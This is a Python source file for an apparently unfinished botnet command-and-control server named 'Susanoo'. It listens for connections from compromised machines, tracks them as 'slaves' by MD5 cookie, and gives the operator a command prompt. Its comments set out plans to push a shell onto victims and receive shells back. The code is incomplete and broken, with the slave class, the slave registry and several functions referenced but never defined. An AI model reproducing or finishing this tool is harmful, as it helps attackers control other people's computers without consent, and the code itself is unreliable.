#!/usr/bin/python

import socket
import sys
import os
import multiprocessing
import threading
import queue
import time
import pytz
import re
import base64
import signal
import hashlib
from datetime import datetime

# Tasks Needed to be done:
#     Find a way to format output in terminal
#     Write code to get data from client result and store it in a queue for later examination 
#     Usage of UP and DOWN arrow keys to switch between history
#     Find a way to use dictonaries rather than queues
#     Add Gitter to this

'''************************UPDATE THIS*****************************
1: Write showResults function and sort out addToQueue Threading
2: find a way to send shell on the victim
3: write a thread to get a shell from the victim.
'''


def createNewCookie(client):
    hostname, port = client.getpeername()
    india_timezone = pytz.timezone('Asia/Kolkata')      # set timezone
    time = datetime.now(india_timezone)
    data = ("%s:%d %s"%(hostname,port,time)).encode()   # taking MD5 hash
    new_cookie = hashlib.md5(data).hexdigest()          # New cookie is created
    slave = Slave(client,new_cookie)
    slaves[new_cookie] = slave

def checkCookie(client):
    data = client.recv(4096)
    data = data.decode('utf-8')
    cookie_pos = data.find('Cookie:')
    key_found = False
    if(cookie_pos != -1):
        cookie = data[cookie_pos+8:cookie_pos+40]
        for key in slaves.keys():
            if key == cookie:
                slave = slaves[cookie]                           
                slave.clientExecuter(data)
                key_found = True
                break
        if(key_found == False):
            sys.stdout.write("[-] Bad Cookie detected\n")
            sys.stdout.write("[+] Sending New Cookie\n")
            createNewCookie(client)
    else:
        createNewCookie(client)

def ctrlCHandler(signum, frame):
    sys.stdout.write("\nctrl-c is pressed to exit type \'exit\'\n")

def handlerCmdShell():

    try:
        while(True):
            handler_cmd = str(input("Susanoo> "))
            if(handler_cmd == ""):
                pass
            elif(handler_cmd == "exit"):
                EXIT_FLAG = True
                sys.stdout.write("\n[+] Killing all running processes")
                for key in slaves.keys():
                    slave = slaves[key]
                    # sys.stdout.write("[DEBUG] slave = {}\n".format(slave))
                    time.sleep(0.1)
                    slave.killProcess()
                time.sleep(2)
                os._exit(0)
                # Close all the process one by one and exit the program after that
            else:
                handlerExecuter(handler_cmd)
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handlerCmdShell. Reason: {}\n".format(ex))
            os._exit(0)


def listener(lhost,lport):

    try:
        signal.signal(signal.SIGINT,ctrlCHandler)
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost,lport))
        sock.listen(100)
        # Started the listener which can handle 100 connections.
        sys.stdout.write ("\n[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
            
        handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=())
        handler_cmd_thread.start()
        # Handler cmd shell started here.
        # It is running as serperate thread to give us an free cmd shell while listener runs in background.
        while(True):
            if EXIT_FLAG:
                break
            (client,client_addr) = sock.accept()
            slave_thread = threading.Thread(target=checkCookie,args=(client,))  # Creating a seperate thread to handle every connection.
            slave_thread.start()
            
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as ex:
        sys.stdout.write("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
        sys.stdout.write("\n[+] Killing all running processes")
        for key in slaves.keys():
            slave = slaves[key]
            time.sleep(0.1)
            slave.killProcess()
        time.sleep(2)
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        os._exit(0)


def main():
    if(len(sys.argv) < 3):
        sys.stdout.write("\n[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport)
            
        except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
            # exit(0)



if __name__ == '__main__':
    main()